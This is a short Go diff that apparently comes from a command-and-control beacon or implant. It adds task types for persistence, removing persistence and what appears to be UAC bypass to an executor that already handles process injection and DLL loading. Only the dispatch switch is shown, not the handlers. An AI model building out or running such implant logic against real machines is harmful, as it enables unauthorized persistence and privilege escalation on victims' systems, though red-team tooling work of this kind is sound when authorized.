@@ -56,6 +56,12 @@ func (e *Executor) Run(ctx context.Context, t *tasking.Task) *tasking.Result {
 		e.runInject(t.Payload, res)
 	case "dll":
 		e.runDll(t.Payload, res)
+	case "persist":
+		e.runPersist(t.Payload, res)
+	case "unpersist":
+		e.runUnpersist(t.Payload, res)
+	case "uac":
+		e.runUac(t.Payload, res)
 	default:
 		res.Error = "beacon: unknown task type " + t.Type
 	}
